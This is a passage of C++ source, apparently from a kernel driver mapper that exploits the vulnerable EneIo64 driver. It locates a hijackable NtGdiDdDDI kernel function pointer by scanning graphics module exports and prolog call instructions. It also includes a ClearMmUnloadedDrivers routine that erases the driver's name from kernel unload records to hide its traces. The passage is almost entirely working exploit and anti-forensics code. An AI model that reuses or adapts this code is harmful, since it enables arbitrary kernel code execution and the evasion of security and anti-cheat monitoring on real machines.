                found_mod = mod;
                break;
            }
        }
    }

    // Phase 2: fallback — enumerate ALL exports from graphics modules, find any NtGdiDdDDI*
    if (!kernel_NtGdiAddress)
    {
        Logger::Log(WRAPPER_MARCO("[EneIo] named export not found, scanning all exports for NtGdiDdDDI*..."));
        Logger::Flush();

        for (auto mod : gdi_modules)
        {
            uint64_t base = utils::GetKernelModuleAddress(mod);
            if (!base) continue;

            IMAGE_DOS_HEADER dos_header = { 0 };
            IMAGE_NT_HEADERS64 nt_headers = { 0 };
            if (!ReadMemory(base, &dos_header, sizeof(dos_header)) ||
                dos_header.e_magic != IMAGE_DOS_SIGNATURE ||
                !ReadMemory(base + dos_header.e_lfanew, &nt_headers, sizeof(nt_headers)) ||
                nt_headers.Signature != IMAGE_NT_SIGNATURE)
                continue;

            const auto export_base = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
            const auto export_base_size = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
            if (!export_base || !export_base_size) continue;

            const auto export_data = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(VirtualAlloc(nullptr, export_base_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
            if (!ReadMemory(base + export_base, export_data, export_base_size))
            {
                VirtualFree(export_data, 0, MEM_RELEASE);
                continue;
            }

            const auto delta = reinterpret_cast<uint64_t>(export_data) - export_base;
            const auto name_table = reinterpret_cast<uint32_t*>(export_data->AddressOfNames + delta);
            const auto ordinal_table = reinterpret_cast<uint16_t*>(export_data->AddressOfNameOrdinals + delta);
            const auto function_table = reinterpret_cast<uint32_t*>(export_data->AddressOfFunctions + delta);

            static const char ddi_prefix[] = "NtGdiDdDDI";
            for (auto i = 0u; i < export_data->NumberOfNames; ++i)
            {
                const char* name = reinterpret_cast<char*>(name_table[i] + delta);
                if (strncmp(name, ddi_prefix, sizeof(ddi_prefix) - 1) != 0)
                    continue;

                const auto fn_addr = base + function_table[ordinal_table[i]];
                if (fn_addr >= base + export_base && fn_addr <= base + export_base + export_base_size)
                    continue; // forwarded export, skip

                Logger::Log(WRAPPER_MARCO("[EneIo] trying fallback export"));
                Logger::Log(name);

                uint8_t probe[0x30] = { 0 };
                if (!ReadMemory(fn_addr, probe, sizeof(probe)))
                    continue;

                int32_t offset = 0;
                int32_t pos = -1;

                for (int32_t j = 0; j <= static_cast<int32_t>(sizeof(probe)) - 6; ++j)
                {
                    if (probe[j] == 0xFF && (probe[j + 1] == 0x15 || probe[j + 1] == 0x1D || probe[j + 1] == 0x25))
                    {
                        offset = *reinterpret_cast<int32_t*>(&probe[j + 2]);
                        pos = j;
                        break;
                    }
                }

                if (pos < 0)
                {
                    for (int32_t j = 0; j <= static_cast<int32_t>(sizeof(probe)) - 5; ++j)
                    {
                        if (probe[j] == 0xE8)
                        {
                            offset = *reinterpret_cast<int32_t*>(&probe[j + 1]);
                            pos = j;
                            break;
                        }
                    }
                }

                if (pos >= 0)
                {
                    kernel_NtGdiAddress = fn_addr;
                    found_mod = mod;
                    function_name = name;
                    Logger::Log(WRAPPER_MARCO("[EneIo] fallback selected"));
                    Logger::Log(name);
                    Logger::Log(WRAPPER_MARCO("in"));
                    Logger::Log(mod);
                    break;
                }
            }

            VirtualFree(export_data, 0, MEM_RELEASE);
            if (kernel_NtGdiAddress)
                break;
        }
    }

    if (!kernel_NtGdiAddress)
    {
        Logger::Log(WRAPPER_MARCO("[EneIo] no NtGdi DDI function found in any graphics module"));
        Logger::Flush();
        return false;
    }

    uint8_t prolog[0x30] = { 0 };
    if (!ReadMemory(kernel_NtGdiAddress, prolog, sizeof(prolog)))
        return false;

    {
        char hex[0x60 * 3 + 1] = { 0 };
        for (int i = 0; i < 0x30; ++i)
            sprintf_s(hex + i * 3, sizeof(hex) - i * 3, "%02X ", prolog[i]);
        Logger::Log(WRAPPER_MARCO("[EneIo] NtGdi prolog:"));
        Logger::Log(hex);
    }

    int32_t func_ptr_offset = 0;
    int32_t found_offset = -1;

    for (int32_t i = 0; i <= static_cast<int32_t>(sizeof(prolog)) - 6; ++i)
    {
        if (prolog[i] == 0xFF && (prolog[i + 1] == 0x15 || prolog[i + 1] == 0x1D || prolog[i + 1] == 0x25))
        {
            func_ptr_offset = *reinterpret_cast<int32_t*>(&prolog[i + 2]);
            found_offset = i;
            Logger::Log(WRAPPER_MARCO("[EneIo] NtGdi: found FF 15/1D/25 at offset"));
            Logger::LogHex(WRAPPER_MARCO("[EneIo] NtGdi: func_ptr_offset"), func_ptr_offset);
            break;
        }
    }

    if (found_offset < 0)
    {
        for (int32_t i = 0; i <= static_cast<int32_t>(sizeof(prolog)) - 5; ++i)
        {
            if (prolog[i] == 0xE8)
            {
                func_ptr_offset = *reinterpret_cast<int32_t*>(&prolog[i + 1]);
                found_offset = i;
                Logger::Log(WRAPPER_MARCO("[EneIo] NtGdi: found E8 at offset"));
                Logger::LogHex(WRAPPER_MARCO("[EneIo] NtGdi: func_ptr_offset"), func_ptr_offset);
                break;
            }
        }
    }

    if (found_offset < 0)
    {
        Logger::Log(WRAPPER_MARCO("[EneIo] NtGdi: no call pattern found in prolog"));
        Logger::Flush();
        return false;
    }

    int32_t instr_len = (prolog[found_offset] == 0xE8) ? 5 : 6;
    m_GdiKernelPtr = kernel_NtGdiAddress + found_offset + instr_len + func_ptr_offset;
    Logger::LogHex(WRAPPER_MARCO("[EneIo] NtGdi: computed kernel ptr"), m_GdiKernelPtr);

    if (!ReadMemory(m_GdiKernelPtr, &m_GdiOriginalFunction, sizeof(m_GdiOriginalFunction)))
        return false;

    m_GdiFunctionName = function_name;
    m_HasGdiInfo = true;

    *out_kernel_function_ptr = m_GdiKernelPtr;
    *out_kernel_original_function_address = m_GdiOriginalFunction;
    return true;
}

bool EneIo64Driver::ClearMmUnloadedDrivers()
{
    ULONG buffer_size = 0;
    void* buffer = nullptr;

    NTSTATUS status = NtQuerySystemInformation(
        static_cast<SYSTEM_INFORMATION_CLASS>(64),
        buffer, buffer_size, &buffer_size);

    while (status == 0xC0000004)
    {
        VirtualFree(buffer, 0, MEM_RELEASE);
        buffer = VirtualAlloc(nullptr, buffer_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        status = NtQuerySystemInformation(
            static_cast<SYSTEM_INFORMATION_CLASS>(64),
            buffer, buffer_size, &buffer_size);
    }

    if (status < 0)
    {
        VirtualFree(buffer, 0, MEM_RELEASE);
        return false;
    }

    uint64_t object = 0;

    auto system_handle_info = static_cast<nt::PSYSTEM_HANDLE_INFORMATION_EX>(buffer);

    for (auto i = 0u; i < system_handle_info->HandleCount; ++i)
    {
        const nt::SYSTEM_HANDLE current_handle = system_handle_info->Handles[i];

        if (current_handle.UniqueProcessId != reinterpret_cast<HANDLE>(static_cast<uint64_t>(GetCurrentProcessId())))
            continue;

        if (current_handle.HandleValue == m_DriverHandle)
        {
            object = reinterpret_cast<uint64_t>(current_handle.Object);
            break;
        }
    }

    VirtualFree(buffer, 0, MEM_RELEASE);

    if (!object)
        return false;

    uint64_t device_object = 0;
    if (!ReadMemory(object + 0x8, &device_object, sizeof(device_object)))
        return false;

    uint64_t driver_object = 0;
    if (!ReadMemory(device_object + 0x8, &driver_object, sizeof(driver_object)))
        return false;

    uint64_t driver_section = 0;
    if (!ReadMemory(driver_object + 0x28, &driver_section, sizeof(driver_section)))
        return false;

    UNICODE_STRING us_driver_base_dll_name = { 0 };
    if (!ReadMemory(driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)))
        return false;

    us_driver_base_dll_name.Length = 0;

    if (!WriteMemory(driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)))
        return false;

    return true;
}
